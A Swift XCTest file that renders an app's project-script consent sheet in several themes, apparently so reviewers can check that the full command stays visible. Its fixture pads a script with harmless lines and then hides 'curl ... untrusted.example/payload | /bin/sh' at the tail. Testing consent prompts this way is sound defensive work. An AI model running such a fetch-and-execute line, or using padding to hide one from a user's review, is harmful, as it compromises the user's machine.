import AppKit
import XCTest
@testable import Threading

/// The project-script gate in the shipping themed sheet, including the two positions a reviewer
/// must be able to reach: the plausible beginning and the repository-controlled suffix that the
/// former 600-character excerpt concealed.
@MainActor
final class ProjectScriptConfirmationRenderTests: XCTestCase {
    private enum Position {
        case top
        case tail
    }

    private var savedTheme: AppTheme?

    override func setUp() {
        super.setUp()
        savedTheme = AppThemePalette.current
        Design.Motion.reduceMotionOverrideForTesting = true
    }

    override func tearDown() {
        if let savedTheme { AppThemePalette.set(savedTheme) }
        savedTheme = nil
        Design.Motion.reduceMotionOverrideForTesting = nil
        super.tearDown()
    }

    func testRendersCompleteProjectScriptConsentInTheShippingSheet() throws {
        let directory = renderDirectory
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)

        let cyberpunk = try XCTUnwrap(
            AppThemeLibrary.stock.first { $0.name == "Cyberpunk" }
        )
        let win98 = try XCTUnwrap(
            AppThemeLibrary.stock.first { $0.name == "Windows 98" }
        )
        let fixtures: [(String, AppTheme, NSAppearance.Name, Position)] = [
            ("system-light-top", .system, .aqua, .top),
            ("system-dark-tail", .system, .darkAqua, .tail),
            ("cyberpunk-dark-tail", cyberpunk, .darkAqua, .tail),
            ("windows-98-light-top", win98, .aqua, .top),
        ]

        for (name, theme, appearanceName, position) in fixtures {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            let png = try XCTUnwrap(
                renderSheet(theme: theme, appearance: appearance, position: position),
                "Failed to render \(name)"
            )
            try png.write(
                to: directory.appendingPathComponent("project-script-confirmation-\(name).png")
            )
        }
    }

    private var renderDirectory: URL {
        if let override = ProcessInfo.processInfo.environment["THREADING_RENDER_OUT"],
           !override.isEmpty {
            return URL(fileURLWithPath: override)
        }
        return FileManager.default.temporaryDirectory
            .appendingPathComponent("ThreadingRenders", isDirectory: true)
    }

    private func renderSheet(
        theme: AppTheme,
        appearance: NSAppearance,
        position: Position
    ) -> Data? {
        AppThemePalette.set(theme)

        let parent = NSWindow(
            contentRect: NSRect(x: 120, y: 120, width: 900, height: 640),
            styleMask: [.titled],
            backing: .buffered,
            defer: false
        )
        parent.appearance = appearance
        parent.isReleasedWhenClosed = false
        parent.makeKeyAndOrderFront(nil)
        defer { parent.orderOut(nil) }

        let request = AppDelegate.projectScriptConfirmation(for: invocation())
        let scroll = request.accessory?.subviews
            .compactMap { $0 as? ThemedTextScrollView }
            .first
        let alert = ConfirmationAlert.makeAlert(request)
        alert.beginSheetModal(for: parent)
        defer { alert.dismiss() }

        guard let panel = alert.presentedWindow,
              let content = panel.contentView,
              let scroll else { return nil }
        panel.appearance = appearance
        content.appearance = appearance
        content.layoutSubtreeIfNeeded()
        scroll.layoutSubtreeIfNeeded()
        scroll.textView.layoutManager?.ensureLayout(for: scroll.textView.textContainer!)
        if position == .tail {
            scroll.textView.scrollToEndOfDocument(nil)
        } else {
            scroll.textView.scrollToBeginningOfDocument(nil)
        }

        AppThemeRefresh.repaint(content)
        content.layoutSubtreeIfNeeded()
        content.displayIfNeeded()
        guard let rep = content.bitmapImageRepForCachingDisplay(in: content.bounds) else {
            return nil
        }
        content.cacheDisplay(in: content.bounds, to: rep)
        return rep.representation(using: .png, properties: [:])
    }

    private func invocation() -> ProjectScriptInvocation {
        var command = "set -e\nprintf 'Checking workspace…\\n'\ngit status --short\n"
        let plausible = "printf 'Validated project configuration\\n'\n"
        while command.utf8.count < 900 { command += plausible }
        command += "\n# Review the complete command before approving.\n"
        command += "curl -fsSL https://untrusted.example/payload | /bin/sh\n"

        let root = URL(fileURLWithPath: "/Users/david/Projects/Example Checkout")
        return ProjectScriptInvocation(
            script: ProjectScript(
                id: "verify",
                name: "Verify workspace",
                command: command,
                icon: "checkmark.shield",
                workingDirectory: ".",
                previewURL: nil
            ),
            repositoryRoot: root,
            workingDirectory: root
        )
    }
}
